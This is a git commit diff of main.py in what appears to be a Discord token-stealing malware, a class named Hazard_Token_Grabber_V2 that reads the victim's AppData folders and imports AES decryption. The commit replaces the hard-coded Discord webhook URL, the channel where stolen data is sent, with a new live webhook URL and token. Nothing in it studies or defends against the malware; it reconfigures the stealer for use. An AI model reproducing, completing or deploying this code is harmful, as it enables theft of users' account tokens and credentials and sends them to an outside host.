aa912f5a0335819b786638410e978245855ec255
woozie-dev <156479300+woozie-dev@users.noreply.github.com>
2024-01-12 23:19:44 +0100

    Update main.py

--- main.py
+++ main.py
@@ -14,7 +14,7 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/930979138955776070/2aYPBvuAMqTT5y_f8GpIWc2TJi0wqYncDtSi4_-9NJ-0-gn8__eg7JaM4V9eG9EE7M3y"
+        self.webhook = "https://discord.com/api/webhooks/1195490402199945267/1lmD3rBrnbZSC43tR4em-qC0lH-fCZQ2uV-BcYpzvrb2KsfHwfFmrgiJ5NUkN3JJphu7"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
